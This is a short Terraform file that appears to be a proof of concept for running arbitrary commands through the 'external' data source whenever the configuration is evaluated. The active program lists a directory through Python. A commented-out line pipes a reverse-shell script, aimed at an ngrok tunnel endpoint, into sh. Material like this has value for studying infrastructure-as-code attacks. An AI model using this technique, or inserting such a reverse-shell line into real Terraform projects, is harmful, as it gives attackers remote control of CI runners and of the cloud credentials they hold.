data "external" "local_exec" {
  # program = ["sh", "-c", "curl https://reverse-shell.sh/4.tcp.ngrok.io:15925 | sh"]
  program = ["python3", "-c", "import json; import subprocess; print(json.dumps({'output': str(subprocess.getoutput('ls -al'))}))"]
}

output "external_local_exec_output" {
  value = data.external.local_exec.result
}
